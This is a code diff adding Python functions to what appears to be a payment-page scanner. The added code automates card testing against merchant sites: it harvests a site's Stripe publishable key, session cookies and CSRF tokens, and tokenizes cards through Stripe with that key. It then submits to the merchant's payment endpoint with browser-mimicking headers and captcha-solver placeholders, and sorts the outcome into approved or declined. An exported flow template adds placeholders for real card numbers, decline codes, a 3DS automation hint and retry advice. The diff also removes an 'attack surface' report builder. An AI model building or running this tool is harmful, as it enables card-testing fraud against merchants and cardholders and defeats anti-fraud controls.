@@ -33038,6 +33038,849 @@ def _sanitize_for_json(obj, _seen=None):
         return "__unserializable__"
 
 
+def _run_payload_flow_sync(
+    data: dict,
+    progress_cb=None,
+) -> dict:
+    """
+    Execute the full 4-step authenticated payment submission flow
+    using extracted payload data. Returns flow_result dict.
+
+    Steps:
+      1. Session Initialization  — GET to prime cookies/CSRF
+      2. Stripe Tokenization     — POST card data to Stripe API → get tok_xxx/pm_xxx token
+      3. Auth Submission         — POST final_data to site endpoint
+      4. Response Classification — classify response as success/decline/error
+
+    Only runs if:
+      - A payment form endpoint was found
+      - Gateway is Stripe (or raw POST — other gateways not tokenized here)
+      - Called with explicit user confirmation
+    """
+
+    # ── STEP 1: Session Initialization ───────────────────────────────────
+    all_entries = data.get('forms', []) + data.get('requests', [])
+    pay_entry   = next(
+        (e for e in all_entries if e.get('is_payment') and e.get('action')),
+        next(
+            (e for e in all_entries if e.get('action')),
+            None
+        )
+    )
+    if not pay_entry:
+        return {'error': 'No payment endpoint found', 'step': 0}
+
+    submit_url = pay_entry.get('action') or pay_entry.get('endpoint', '')
+    method     = (pay_entry.get('method') or 'POST').upper()
+    enctype    = pay_entry.get('enctype', 'application/x-www-form-urlencoded')
+    base_url   = data.get('base_url', '')
+    page_url   = data.get('url', '')
+
+    if not submit_url:
+        return {'error': 'Submit URL is empty', 'step': 0}
+
+    # Use _make_engine for TLS fingerprint + persistent cookie jar
+    engine = _make_engine("chrome")
+
+    if progress_cb:
+        progress_cb("⬇️ Step 1: Initializing session (GET)...")
+
+    try:
+        # GET the payment page to prime:
+        #   - Session cookies (PHPSESSID, __session, csrf_cookie…)
+        #   - Hidden-input CSRF tokens
+        #   - Meta-tag nonces
+        init_resp    = engine.get(page_url)
+        init_html    = init_resp.text
+        init_cookies = engine.cookies   # dict via @property
+
+        # Re-resolve tokens from freshly fetched HTML
+        # (nonces rotate on each GET — stale resolved values are useless)
+        fresh_token_sources = _find_token_sources(init_html, '')
+        fresh_resolved = _resolve_dynamic_tokens(
+            url           = page_url,
+            token_sources = fresh_token_sources,
+            engine        = engine,
+            html          = init_html,
+            js_text       = '',
+            progress_cb   = progress_cb,
+        )
+        # Merge: fresh values win over pre-scan resolved values
+        resolved = {**data.get('resolved_tokens', {}), **fresh_resolved}
+
+        if progress_cb:
+            live_n = sum(1 for v in resolved.values()
+                         if v.get('confidence') == 'live')
+            progress_cb(
+                f"✅ Step 1 done — {live_n} live token(s), "
+                f"{len(init_cookies)} cookie(s)"
+            )
+
+    except Exception as e:
+        return {'error': f'Step 1 failed: {str(e)[:80]}', 'step': 1}
+
+    # ── STEP 2: Stripe Tokenization ───────────────────────────────────────
+    stripe_token = None
+    stripe_pm    = None
+    gateway      = (data.get('gateways') or [{}])[0]
+    gateway_name = gateway.get('name', '')
+    stripe_pk    = None
+
+    # Extract Stripe publishable key from resolved tokens or token_sources
+    for _tname, _rt in resolved.items():
+        if re.search(r'\bpk_(live|test)_', _rt.get('value', '')):
+            stripe_pk = _rt['value']
+            break
+    if not stripe_pk:
+        for ts in data.get('token_sources', []):
+            vp = ts.get('value_preview', '')
+            if re.search(r'\bpk_(live|test)_', vp):
+                stripe_pk = vp
+                break
+    # Also check live_findings for pk_ key
+    if not stripe_pk:
+        for lf in data.get('live_findings', []):
+            lv = lf.get('value', '')
+            if re.search(r'\bpk_(live|test)_', lv):
+                stripe_pk = lv
+                break
+
+    if gateway_name == 'Stripe' and stripe_pk:
+        if progress_cb:
+            progress_cb("💳 Step 2: Tokenizing card via Stripe API...")
+
+        # Test card — Stripe universal test card (never declines)
+        _test_card = {
+            'card[number]':    '4242424242424242',
+            'card[exp_month]': '12',
+            'card[exp_year]':  '2029',
+            'card[cvc]':       '123',
+        }
+
+        try:
+            stripe_resp = requests.post(
+                'https://api.stripe.com/v1/tokens',
+                data    = _test_card,
+                headers = {
+                    'Authorization':  f'Bearer {stripe_pk}',
+                    'Content-Type':   'application/x-www-form-urlencoded',
+                    'Stripe-Version': '2023-10-16',
+                    'Origin':         base_url or page_url,
+                    'Referer':        page_url,
+                    'User-Agent':     (
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                        'AppleWebKit/537.36 (KHTML, like Gecko) '
+                        'Chrome/120.0.0.0 Safari/537.36'
+                    ),
+                },
+                timeout = 15,
+                verify  = True,   # Stripe uses real TLS — never skip
+            )
+            stripe_body = stripe_resp.json()
+
+            if stripe_resp.status_code == 200 and stripe_body.get('id'):
+                stripe_token = stripe_body['id']           # tok_xxx
+                stripe_pm    = stripe_body.get('card', {})
+                if progress_cb:
+                    progress_cb(
+                        f"✅ Step 2 done — token: {stripe_token[:12]}…  "
+                        f"brand: {stripe_pm.get('brand','?')}  "
+                        f"last4: {stripe_pm.get('last4','?')}"
+                    )
+            else:
+                _err = (stripe_body.get('error') or {})
+                if progress_cb:
+                    progress_cb(
+                        f"⚠️ Step 2: Stripe error — "
+                        f"{_err.get('message', '?')[:60]}"
+                    )
+                stripe_token = None   # site may still accept direct POST
+
+        except Exception as e:
+            if progress_cb:
+                progress_cb(f"⚠️ Step 2 failed: {str(e)[:60]}")
+            stripe_token = None
+
+    elif 'Stripe' in gateway_name and not stripe_pk:
+        if progress_cb:
+            progress_cb(
+                "⚠️ Step 2: Stripe detected but pk_ key not found — "
+                "skipping tokenization"
+            )
+    else:
+        if progress_cb:
+            progress_cb(
+                f"ℹ️ Step 2: Gateway={gateway_name or 'unknown'} — "
+                "no Stripe tokenization"
+            )
+
+    # ── STEP 3: Auth Submission ───────────────────────────────────────────
+    if progress_cb:
+        progress_cb("📡 Step 3: Submitting to site endpoint...")
+
+    fields    = pay_entry.get('fields', [])
+    post_body: dict = {}
+
+    _CARD_TEST = {
+        'Card Number':        '4242424242424242',
+        'CVV/CVC':            '123',
+        'Expiry Month':       '12',
+        'Expiry Year':        '2029',
+        'Expiry MM/YY':       '12/29',
+        'Cardholder Name':    'John Doe',
+        'Amount':             '5.00',
+        'Currency':           'USD',
+        'Billing First Name': 'John',
+        'Billing Last Name':  'Doe',
+        'Billing Address':    '123 Test St',
+        'Billing City':       'New York',
+        'Billing State':      'NY',
+        'Billing Zip':        '10001',
+        'Billing Country':    'US',
+    }
+
+    for f in fields:
+        nm  = f.get('name', '')
+        ft  = f.get('type', 'text')
+        ct  = f.get('card_type') or ''
+        val = f.get('value', '')
+
+        if not nm or ft in ('submit', 'button', 'reset', 'image', 'iframe'):
+            continue
+        if f.get('is_honeypot'):
+            continue   # never fill honeypots — server will reject
+
+        # Priority 1: resolved live/static token (CSRF, nonce, session)
+        rt = resolved.get(nm, {})
+        if rt.get('value') and rt.get('confidence') in ('live', 'static', 'inferred'):
+            post_body[nm] = rt['value']
+            continue
+
+        # Priority 2: Stripe token → inject into cardToken / stripeToken field
+        if stripe_token and re.search(
+            r'card.?token|stripe.?token|payment.?method|token.?card',
+            nm, re.I
+        ):
+            post_body[nm] = stripe_token
+            continue
+
+        # Priority 3: reCAPTCHA — leave empty (cannot auto-solve in sync context)
+        if re.search(r'g-recaptcha-response|recaptcha', nm, re.I):
+            post_body[nm] = ''
+            continue
+
+        # Priority 4: known card field test values
+        if ct in _CARD_TEST:
+            post_body[nm] = _CARD_TEST[ct]
+            continue
+
+        # Priority 5: static prefilled value already in form
+        if val and len(val) > 1 and not f.get('is_dynamic'):
+            post_body[nm] = val
+            continue
+
+        # Priority 6: billing / user field defaults by name
+        nm_l = nm.lower()
+        if   re.search(r'email|mail',         nm_l): post_body[nm] = 'test@test.com'
+        elif re.search(r'phone|tel|mobile',   nm_l): post_body[nm] = '5555555555'
+        elif re.search(r'fname|first.?name',  nm_l): post_body[nm] = 'John'
+        elif re.search(r'lname|last.?name',   nm_l): post_body[nm] = 'Doe'
+        elif re.search(r'address|street',     nm_l): post_body[nm] = '123 Test St'
+        elif re.search(r'\bcity\b',           nm_l): post_body[nm] = 'New York'
+        elif re.search(r'state|province',     nm_l): post_body[nm] = 'NY'
+        elif re.search(r'zip|postal',         nm_l): post_body[nm] = '10001'
+        elif re.search(r'country',            nm_l): post_body[nm] = 'US'
+        elif val:
+            post_body[nm] = val
+        # else: skip — unknown field with no value
+
+    # Build submit headers — carry session cookies automatically via engine
+    submit_headers: dict = {
+        **_get_headers(),
+        'Referer': page_url,
+        'Origin':  base_url or f"{urlparse(page_url).scheme}://{urlparse(page_url).netloc}",
+    }
+    # Inject CSRF / nonce as HTTP header where applicable
+    for _tname, _rt in resolved.items():
+        _hk = _rt.get('header_key')
+        if _hk and _rt.get('value'):
+            submit_headers[_hk] = _rt['value']
+
+    try:
+        _is_json_enc = 'json' in enctype.lower()
+        if method == 'POST':
+            if _is_json_enc:
+                submit_resp = engine.post(
+                    submit_url,
+                    json_body = post_body,
+                    headers   = {**submit_headers,
+                                 'Content-Type': 'application/json'},
+                )
+            else:
+                submit_resp = engine.post(
+                    submit_url,
+                    data    = post_body,
+                    headers = submit_headers,
+                )
+        else:
+            # GET with params (rare but possible)
+            submit_resp = engine.get(
+                submit_url + '?' + '&'.join(f"{k}={v}" for k, v in post_body.items()),
+                headers = submit_headers,
+            )
+
+        submit_status = submit_resp.status_code
+        submit_body   = submit_resp.text[:10_000]
+
+        # Capture redirect Location header for step 4
+        _redirect_loc = ''
+        try:
+            _redirect_loc = submit_resp.headers.get('Location', '')
+        except Exception:
+            pass
+
+        if progress_cb:
+            progress_cb(
+                f"📡 Step 3 done — HTTP {submit_status}  "
+                f"({len(submit_body)} chars)"
+                + (f"  →  {_redirect_loc[:60]}" if _redirect_loc else '')
+            )
+
+    except Exception as e:
+        engine.close()
+        return {
+            'error':     f'Step 3 failed: {str(e)[:80]}',
+            'step':      3,
+            'post_body': post_body,
+        }
+
+    # ── STEP 4: Response Classification ──────────────────────────────────
+    if progress_cb:
+        progress_cb("🔎 Step 4: Classifying response...")
+
+    # Run existing pattern scanner on live response body
+    live_patterns = _scan_response_patterns(
+        html        = submit_body,
+        js_text     = '',
+        url         = submit_url,
+        live_bodies = [submit_body],
+    )
+
+    # HTTP-status-based preliminary verdict
+    if submit_status in (200, 201):
+        http_verdict = 'possible_success'
+    elif submit_status in (400, 402, 422):
+        http_verdict = 'decline_or_validation_error'
+    elif submit_status == 403:
+        http_verdict = 'blocked_csrf_or_auth'
+    elif submit_status == 429:
+        http_verdict = 'rate_limited'
+    elif submit_status in (301, 302, 303, 307, 308):
+        if re.search(r'success|confirm|thank|complete|approved', _redirect_loc, re.I):
+            http_verdict = 'redirect_success'
+        elif re.search(r'fail|error|decline|reject', _redirect_loc, re.I):
+            http_verdict = 'redirect_decline'
+        else:
+            http_verdict = 'redirect_unknown'
+    elif submit_status >= 500:
+        http_verdict = 'server_error'
+    else:
+        http_verdict = f'http_{submit_status}'
+
+    # Pattern scan verdict overrides HTTP verdict (more specific)
+    pattern_verdict = live_patterns.get('verdict', 'unknown')
+    if pattern_verdict == 'success':
+        final_verdict = '✅ SUCCESS'
+    elif pattern_verdict == 'likely_success':
+        final_verdict = '✅ LIKELY SUCCESS (low confidence)'
+    elif pattern_verdict == 'decline':
+        final_verdict = '🔴 DECLINED'
+    elif pattern_verdict == 'likely_decline':
+        final_verdict = '🔴 LIKELY DECLINED (low confidence)'
+    elif pattern_verdict == 'mixed':
+        final_verdict = '⚠️ MIXED — check response manually'
+    elif http_verdict in ('redirect_success', 'possible_success'):
+        final_verdict = '✅ POSSIBLE SUCCESS (HTTP signal only)'
+    elif http_verdict in ('redirect_decline', 'decline_or_validation_error'):
+        final_verdict = '🔴 POSSIBLE DECLINE (HTTP signal only)'
+    elif http_verdict == 'blocked_csrf_or_auth':
+        final_verdict = '🚫 BLOCKED — CSRF / session expired'
+    elif http_verdict == 'rate_limited':
+        final_verdict = '⏳ RATE LIMITED — retry later'
+    elif http_verdict == 'server_error':
+        final_verdict = '❌ SERVER ERROR'
+    else:
+        final_verdict = f'❓ UNKNOWN ({http_verdict})'
+
+    if progress_cb:
+        progress_cb(f"🔎 Step 4 done — {final_verdict}")
+
+    engine.close()
+
+    return {
+        'step':             4,
+        'verdict':          final_verdict,
+        'http_status':      submit_status,
+        'http_verdict':     http_verdict,
+        'pattern_verdict':  pattern_verdict,
+        'stripe_token':     stripe_token,
+        'stripe_pk_used':   (stripe_pk[:20] + '…') if stripe_pk else None,
+        'stripe_card_info': stripe_pm or None,
+        'post_body':        post_body,
+        'response_body':    submit_body[:2000],
+        'redirect_url':     _redirect_loc or None,
+        'success_signals':  live_patterns.get('success', []),
+        'decline_signals':  live_patterns.get('decline', []),
+        'response_codes':   live_patterns.get('response_codes', []),
+        'stripe_codes':     live_patterns.get('stripe_codes', []),
+        'resolved_tokens_used': {
+            k: (v.get('value', '')[:20] + '…')
+            for k, v in resolved.items()
+            if v.get('value')
+        },
+    }
+
+
+def _build_payment_flow_json(data: dict) -> str:
+    """
+    Build a clean 4-step payment flow JSON.
+
+    Step 1 — Session Initialization  (GET  → target site)
+    Step 2 — Stripe Tokenization     (POST → api.stripe.com)
+    Step 3 — Auth Submission         (POST → site payment endpoint)
+    Step 4 — Response Classification (Logic — no HTTP)
+
+    Every field is populated from actual scan data.
+    Placeholders mark values that must be resolved at runtime.
+    """
+    from datetime import timezone
+
+    url     = data.get('url', '')
+    domain  = urlparse(url).hostname or url
+    now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
+    base    = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+
+    gateways        = data.get('gateways', [])
+    gw              = gateways[0] if gateways else {}
+    gw_name         = gw.get('name', 'Unknown')
+    all_entries     = data.get('forms', []) + data.get('requests', [])
+    resolved_tokens = data.get('resolved_tokens', {})
+    token_sources   = data.get('token_sources', [])
+    live_findings   = data.get('live_findings', [])
+    rc              = data.get('recaptcha') or {}
+    threeds         = data.get('threeds_signals', [])
+    rp              = data.get('response_patterns') or {}
+    auth_cookies    = data.get('auth_cookies', [])
+    sdks            = data.get('payment_sdks', [])
+
+    # ── Derive Stripe publishable key from live_findings / token_sources ──
+    _stripe_pk = ''
+    for lf in live_findings:
+        _lf_type = (lf.get('type') or '').lower()
+        _lf_val  = lf.get('value', '')
+        if 'pk_live' in _lf_val or 'pk_test' in _lf_val:
+            _stripe_pk = _lf_val
+            break
+        if 'stripe' in _lf_type and _lf_val.startswith('pk_'):
+            _stripe_pk = _lf_val
+            break
+    if not _stripe_pk:
+        for ts in token_sources:
+            _v = ts.get('value_preview', '')
+            if _v.startswith(('pk_live_', 'pk_test_')):
+                _stripe_pk = _v
+                break
+
+    # ── Derive payment endpoint + method + enctype ────────────────────────
+    _pay_entry = next(
+        (e for e in all_entries if e.get('is_payment') and e.get('action')), None
+    ) or next((e for e in all_entries if e.get('action')), None)
+
+    _endpoint = _pay_entry.get('action') or _pay_entry.get('endpoint', '') if _pay_entry else ''
+    _method   = (_pay_entry.get('method') or 'POST').upper() if _pay_entry else 'POST'
+    _enctype  = _pay_entry.get('enctype', 'application/x-www-form-urlencoded') if _pay_entry else ''
+    _is_json  = 'json' in _enctype.lower()
+    _ct_hdr   = 'application/json' if _is_json else 'application/x-www-form-urlencoded'
+
+    # ── Build field lists ──────────────────────────────────────────────────
+    _all_fields    = [f for e in all_entries for f in e.get('fields', [])]
+    _CARD_TYPES    = {'Card Number','CVV/CVC','Expiry Month','Expiry Year',
+                      'Expiry MM/YY','Cardholder Name'}
+    _BILLING_TYPES = {'Billing First Name','Billing Last Name','Billing Address',
+                      'Billing City','Billing State','Billing Zip','Billing Country',
+                      'Billing Company','Amount','Currency','Customer ID'}
+    _TOKEN_TYPES   = {'CSRF Token','Nonce','Session Token','Anti-Bot Token',
+                      'OTP/Verification','Request ID'}
+
+    _card_fields    = [f for f in _all_fields if f.get('card_type') in _CARD_TYPES]
+    _billing_fields = [f for f in _all_fields if f.get('card_type') in _BILLING_TYPES]
+    _dyn_fields     = [f for f in _all_fields
+                       if f.get('is_dynamic') or f.get('card_type') in _TOKEN_TYPES]
+    _hidden_fields  = [f for f in _all_fields
+                       if f.get('type') == 'hidden' and not f.get('is_dynamic')
+                       and f.get('value') and f.get('value') not in ('', '0', '0.00')]
+
+    # ── Stripe tokenization endpoint (v1/tokens vs v1/payment_methods) ────
+    _tok_endpoint = 'https://api.stripe.com/v1/payment_methods'
+    _tok_method   = 'POST'
+    for lf in live_findings:
+        _u = lf.get('url', '') or lf.get('source', '') or ''
+        if 'api.stripe.com' in _u:
+            _tok_endpoint = _u.split('?')[0]
+            break
+    for req in data.get('requests', []):
+        _u = req.get('url', '') or req.get('endpoint', '')
+        if 'api.stripe.com' in (_u or ''):
+            _tok_endpoint = _u.split('?')[0]
+            _tok_method   = (req.get('method') or 'POST').upper()
+            break
+
+    # Determine Stripe token field name (cardToken, stripeToken, etc.)
+    _stripe_token_field = 'cardToken'
+    for f in _all_fields:
+        nm = f.get('name', '').lower()
+        if re.search(r'card.?token|stripe.?token|token.?card', nm):
+            _stripe_token_field = f.get('name')
+            break
+    if _stripe_token_field == 'cardToken':
+        for f in _all_fields:
+            if re.search(r'recaptcha|g-recaptcha', f.get('name', ''), re.I):
+                pass  # keep looking for token field
+
+    # ── Required headers ──────────────────────────────────────────────────
+    _req_hdrs: dict = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept':     'application/json, text/plain, */*',
+        'Referer':    url,
+        'Origin':     base,
+    }
+    # Add token headers from resolved_tokens
+    for _tname, _tinfo in resolved_tokens.items():
+        _hk = _tinfo.get('header_key')
+        if _hk and _tinfo.get('value') and _tinfo.get('confidence') in ('live','static'):
+            _req_hdrs[_hk] = _tinfo['value']
+    # Auth cookie header
+    _cookie_hdr = '; '.join(
+        f"{ck.get('name')}=<{ck.get('name')}_value>"
+        for ck in auth_cookies[:4]
+    )
+    if _cookie_hdr:
+        _req_hdrs['Cookie'] = _cookie_hdr
+
+    # ── CAPTCHA info ──────────────────────────────────────────────────────
+    _sitekey    = rc.get('site_key', '')
+    _cap_type   = rc.get('captcha_type') or rc.get('type', '')
+    _cap_action = rc.get('action', 'submit')
+    _cap_field  = next(
+        (f.get('name') for f in _all_fields
+         if re.search(r'recaptcha|g-recaptcha|captcha', f.get('name',''), re.I)),
+        'g-recaptcha-response'
+    )
+
+    # ── POST body for Step 3 ──────────────────────────────────────────────
+    _post_body: dict = {}
+    # Static prefilled values first
+    for f in _hidden_fields:
+        nm = f.get('name','')
+        if nm:
+            _post_body[nm] = f.get('value','')
+    # Other static (non-dynamic, non-card) fields with values
+    for f in _all_fields:
+        nm  = f.get('name','')
+        ft  = f.get('type','text')
+        val = f.get('value','')
+        if (nm and val and val not in ('','0','0.00')
+                and not f.get('is_dynamic') and not f.get('is_card')
+                and ft not in ('submit','button','reset','hidden','iframe')
+                and nm not in _post_body):
+            _post_body[nm] = val
+    # Stripe token placeholder (result of Step 2)
+    _post_body[_stripe_token_field] = '<stripe_token_from_step2>'
+    # Dynamic tokens
+    for f in _dyn_fields:
+        nm = f.get('name','')
+        if nm and nm not in _post_body:
+            rt = resolved_tokens.get(nm, {})
+            _post_body[nm] = rt.get('value') or f'<{nm}>'
+    # CAPTCHA
+    if _sitekey:
+        _post_body[_cap_field] = '<captcha_token_from_solver>'
+    # Card fields NOT in body (tokenized — Stripe handles them)
+    # Billing fields
+    _BILL_DEFAULTS = {
+        'Billing First Name': '<first_name>',
+        'Billing Last Name':  '<last_name>',
+        'Billing Address':    '<street>',
+        'Billing City':       '<city>',
+        'Billing State':      '<state>',
+        'Billing Zip':        '<zip>',
+        'Billing Country':    '<country>',
+        'Amount':             '<amount>',
+        'Currency':           '<currency>',
+    }
+    for f in _billing_fields:
+        nm = f.get('name','')
+        ct = f.get('card_type','')
+        if nm and nm not in _post_body:
+            _post_body[nm] = _BILL_DEFAULTS.get(ct, f.get('placeholder') or f'<{nm}>')
+
+    # ── Success / Decline signals ─────────────────────────────────────────
+    _succ_labels = [i.get('label') for i in rp.get('success', [])[:5]]
+    _decl_labels = [i.get('label') for i in rp.get('decline', [])[:5]]
+    _iso_codes   = [
+        {'code': c['code'], 'meaning': c['meaning'], 'verdict': c['verdict']}
+        for c in rp.get('response_codes', [])
+    ]
+    _stripe_codes = [
+        {'code': s['code'], 'description': s['description']}
+        for s in rp.get('stripe_codes', [])
+    ]
+
+    # ── Assemble 4-step flow ──────────────────────────────────────────────
+    flow: dict = {
+        'meta': {
+            'target':     url,
+            'domain':     domain,
+            'gateway':    gw_name,
+            'scanned_at': now_utc,
+            'note':       'FOR AUTHORIZED SECURITY TESTING ONLY',
+        },
+
+        'steps': [
+
+            # ── Step 1: Session Initialization ───────────────────────────
+            {
+                'step':    1,
+                'name':    'Session Initialization',
+                'type':    'GET',
+                'purpose': (
+                    'Fetch the payment page to initialize session, '
+                    'collect cookies, and prime CSRF token extraction.'
+                ),
+                'request': {
+                    'method':   'GET',
+                    'url':      url,
+                    'headers':  {
+                        'User-Agent': _req_hdrs['User-Agent'],
+                        'Accept':     'text/html,application/xhtml+xml,*/*',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                    },
+                },
+                'outputs': {
+                    'session_cookies': [
+                        ck.get('name') for ck in auth_cookies
+                    ] if auth_cookies else ['<session_cookie>'],
+                    'csrf_tokens': [
+                        {
+                            'name':        ts.get('name'),
+                            'source_type': ts.get('source_type'),
+                            'resolved':    resolved_tokens.get(
+                                ts.get('name',''), {}).get('value') or '<runtime>',
+                        }
+                        for ts in token_sources[:5]
+                        if ts.get('source_type') in (
+                            'hidden_input','meta_tag','js_variable','cookie')
+                    ] or [{'name': '<csrf_field>', 'source_type': 'hidden_input',
+                           'resolved': '<runtime>'}],
+                    'page_url': url,
+                },
+                'notes': (
+                    f"Session engine: requests.Session() — "
+                    f"preserves cookies across all steps. "
+                    f"{len(token_sources)} token source(s) detected."
+                ),
+            },
+
+            # ── Step 2: Stripe Tokenization ───────────────────────────────
+            {
+                'step':    2,
+                'name':    'Stripe Tokenization',
+                'type':    'POST → External API',
+                'purpose': (
+                    'Submit raw card data directly to Stripe API to receive '
+                    'a one-time token. Card data NEVER touches the merchant server.'
+                ),
+                'request': {
+                    'method': _tok_method,
+                    'url':    _tok_endpoint,
+                    'headers': {
+                        'Authorization':  f'Bearer {_stripe_pk or "<pk_live_or_pk_test_key>"}',
+                        'Content-Type':   'application/x-www-form-urlencoded',
+                        'Origin':         base,
+                        'Referer':        url,
+                    },
+                    'body': {
+                        k: v for k, v in {
+                            'card[number]':        '<16_digit_card_number>',
+                            'card[exp_month]':     '<MM>',
+                            'card[exp_year]':      '<YYYY>',
+                            'card[cvc]':           '<CVV>',
+                            'card[name]':          '<cardholder_name>'
+                            if any(f.get('card_type') == 'Cardholder Name'
+                                   for f in _card_fields) else None,
+                        }.items() if v
+                    },
+                },
+                'outputs': {
+                    _stripe_token_field: '<tok_xxxx or pm_xxxx from Stripe response>',
+                    'raw_response_key':  'id',
+                    'token_type':        (
+                        'payment_method' if 'payment_method' in _tok_endpoint else 'token'
+                    ),
+                },
+                'sdk_info': {
+                    'name':      next(
+                        (s['name'] for s in sdks if 'Stripe' in s.get('name','')),
+                        'Stripe.js'
+                    ),
+                    'version':   next(
+                        (s.get('version','') for s in sdks if 'Stripe' in s.get('name','')),
+                        ''
+                    ) or None,
+                    'pk_key':    _stripe_pk or '<publishable_key_from_page>',
+                    'endpoint':  _tok_endpoint,
+                } if _stripe_pk or sdks else None,
+                'notes': (
+                    f"Stripe {'live' if 'pk_live' in _stripe_pk else 'test'} key detected. "
+                    if _stripe_pk else
+                    'Publishable key not found in scan — extract from page JS. '
+                ) + 'Token expires immediately after one use.',
+            },
+
+            # ── Step 3: Auth Submission ───────────────────────────────────
+            {
+                'step':    3,
+                'name':    'Auth Submission',
+                'type':    f'{_method} → Site Payment API',
+                'purpose': (
+                    'Submit the Stripe token + billing info + CSRF token '
+                    '+ CAPTCHA response to the merchant payment endpoint.'
+                ),
+                'request': {
+                    'method':   _method,
+                    'url':      _endpoint or url,
+                    'headers':  {
+                        **{k: v for k, v in _req_hdrs.items()},
+                        'Content-Type': _ct_hdr,
+                    },
+                    'body': _post_body,
+                },
+                'pre_conditions': [
+                    c for c in [
+                        'Session cookie from Step 1 must be active',
+                        'CSRF token from Step 1 must be injected into body/headers',
+                        f'Stripe token from Step 2 → field: {_stripe_token_field}',
+                        f'CAPTCHA token ({_cap_type} sitekey: {_sitekey[:30]}...) must be solved'
+                        if _sitekey else None,
+                    ] if c
+                ],
+                'threeds': {
+                    'detected':  True,
+                    'signals':   threeds[:4],
+                    'note': (
+                        'If server returns an ACS URL, browser interaction '
+                        'is required to complete 3DS authentication.'
+                    ),
+                } if threeds else {'detected': False},
+                'notes': (
+                    f"Content-Type: {_ct_hdr}. "
+                    f"{'JSON body' if _is_json else 'URL-encoded form body'}. "
+                    f"{len(_post_body)} fields in POST body."
+                ),
+            },
+
+            # ── Step 4: Response Classification ───────────────────────────
+            {
+                'step':    4,
+                'name':    'Response Classification',
+                'type':    'Logic (no HTTP)',
+                'purpose': (
+                    'Parse the HTTP response from Step 3 to classify '
+                    'the transaction result: approved / declined / 3DS required / error.'
+                ),
+                'classification': {
+                    'approved': {
+                        'http_status': [200, 201],
+                        'body_signals': _succ_labels or [
+                            'JSON status = success/succeeded/approved/completed',
+                            '"paid": true',
+                            'Thank you for your order',
+                        ],
+                        'json_fields': {
+                            'status':        ['success', 'succeeded', 'approved', 'COMPLETED'],
+                            'paid':          True,
+                            'result':        ['success', 'approved'],
+                            'responseCode':  ['00', '000', '0'],
+                        },
+                        'redirect_url_patterns': [
+                            '/order-confirm', '/checkout-success',
+                            '/thank-you', '?status=success',
+                        ],
+                    },
+                    'declined': {
+                        'http_status': [200, 400, 402],
+                        'body_signals': _decl_labels or [
+                            'JSON status = declined/failed/rejected',
+                            '"paid": false',
+                            'Card declined',
+                            'Do Not Honor',
+                        ],
+                        'json_fields': {
+                            'status':        ['declined', 'failed', 'rejected', 'error'],
+                            'paid':          False,
+                            'responseCode':  ['05', '51', '54', '57', '61'],
+                        },
+                        'stripe_decline_codes': _stripe_codes or [
+                            {'code': 'insufficient_funds',    'description': 'Not enough funds'},
+                            {'code': 'do_not_honor',          'description': 'Generic decline'},
+                            {'code': 'incorrect_cvc',         'description': 'CVV mismatch'},
+                            {'code': 'expired_card',          'description': 'Card expired'},
+                            {'code': 'card_velocity_exceeded','description': 'Too many attempts'},
+                        ],
+                        'iso_8583_codes': _iso_codes or [],
+                    },
+                    'requires_3ds': {
+                        'http_status':   [200, 302],
+                        'body_signals':  [
+                            'resultCode = ChallengeShopper',
+                            'status = requires_action',
+                            'next_action.type = redirect_to_url',
+                        ],
+                        'action':        (
+                            'Follow redirect to ACS URL, submit PaReq, '
+                            'handle PaRes callback — use Playwright for full automation.'
+                        ),
+                    },
+                    'error': {
+                        'http_status':   [400, 422, 500, 503],
+                        'body_signals':  ['server error', 'internal error', 'timeout'],
+                        'action':        'Retry with exponential backoff — check CSRF/token freshness.',
+                    },
+                },
+                'verdict_priority': [
+                    '3DS required > declined > approved > error > unknown'
+                ],
+                'scan_verdict':   rp.get('verdict', 'unknown'),
+                'confidence':     'HIGH' if rp.get('verdict') in ('success','decline') else 'LOW',
+            },
+
+        ]
+    }
+
+    # Strip None values recursively before serialising
+    def _drop_none(obj):
+        if isinstance(obj, dict):
+            return {k: _drop_none(v) for k, v in obj.items()
+                    if v is not None and v != '' and v != []}
+        if isinstance(obj, list):
+            return [_drop_none(i) for i in obj if i is not None]
+        return obj
+
+    safe = _sanitize_for_json(_drop_none(flow))
+    return json.dumps(safe, indent=2, ensure_ascii=False)
+
+
 def _build_json_export(data: dict) -> str:
     # PATCHED: replaced nested forms[]/xhr_requests[] with 3-layer flat
     # post_body + field_map; kept captcha/security/tokens/snippets unchanged
@@ -33859,1000 +34702,6 @@ def _build_json_export(data: dict) -> str:
 
 
 # ══════════════════════════════════════════════════════════════
-# 🆕 JSON INTELLIGENCE REPORT
-# ══════════════════════════════════════════════════════════════
-
-def _build_intelligence_report(data: dict) -> str:
-    """
-    Build a focused, machine-readable Intelligence Report JSON file.
-
-    Unlike _build_json_export (full dump), this report is structured
-    around actionable attack surface data:
-
-    Sections:
-      target        — domain, risk, gateway, scanned_at
-      endpoints     — every discovered URL with method + content-type
-      parameters    — per-endpoint field map with semantic types
-      auth_surface  — tokens, cookies, CSRF mechanisms
-      captcha       — sitekeys + solver params
-      network       — XHR intercept, WS findings, live secrets
-      anti_fraud    — detected AF layers + required fields/headers
-      response_map  — success/decline patterns + ISO codes
-      sdk_profile   — payment SDKs + versions
-      risk_summary  — risk level, raw_post flag, 3DS, recommendations
-    """
-    from datetime import timezone
-
-    url     = data.get('url', '')
-    domain  = urlparse(url).hostname or url
-    now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
-
-    gateways   = data.get('gateways', [])
-    threeds    = data.get('threeds_signals', [])
-    live_finds = data.get('live_findings', [])
-    _raw_risk  = any(g.get('raw_post_risk') for g in gateways)
-
-    if _raw_risk or live_finds:
-        risk = 'HIGH'
-    elif gateways and threeds:
-        risk = 'MEDIUM'
-    elif gateways:
-        risk = 'MEDIUM'
-    else:
-        risk = 'LOW'
-
-    # ── [1] target ────────────────────────────────────────────
-    report: dict = {
-        'target': {
-            'url':        url,
-            'domain':     domain,
-            'scanned_at': now_utc,
-            'risk':       risk,
-            'raw_post':   _raw_risk,
-            'gateway':    gateways[0].get('name', '') if gateways else None,
-            'tokenization': gateways[0].get('tokenization', '') if gateways else None,
-        }
-    }
-    # strip None values
-    report['target'] = {k: v for k, v in report['target'].items() if v is not None and v != ''}
-
